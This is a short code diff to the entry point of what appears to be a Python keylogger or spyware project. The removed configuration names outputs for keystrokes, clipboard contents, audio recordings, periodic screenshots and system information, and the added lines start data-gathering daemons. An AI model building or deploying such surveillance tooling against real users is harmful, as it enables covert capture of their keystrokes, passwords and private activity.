@@ -1,25 +1,12 @@
-from src.domain.config import Config
 from src.applications.common.logger_handler import Logger
+from src.applications.daemons.make import make_daemons
+from src.applications.computer_information import get_computer_information
+from src.config import config
 from src.main import Main
 
-
-config: Config = {
-    "FILE_PATH": "./output",
-    "EXTEND": "/",  # on windows use "\\",
-    "ENCRYPT_KEY": "",
-    "SYSTEM_INFORMATION": "syseminfo.txt",
-    "CLIPBOARD_INFORMATION": "clipboard.txt",
-    "AUDIO_INFORMATION": "audio.wav",
-    "SCREENSHOT_INTERVAL": 1,
-    "SCREENSHOT_INFORMATION": "screenshot.png",
-    "KEYS_INTERVAL": 1,
-    "KEYS_INFORMATION": "key_log.txt",
-}
-
-
 if __name__ == "__main__":
-    Main(config, logger=Logger("Main"))
-
+    get_computer_information(config, Logger("ComputerInfo"))
+    Main(Logger("Main"), make_daemons(config)).init()
 
 """
 "AUDIO_INFORMATION_E": "e_audio.wav",
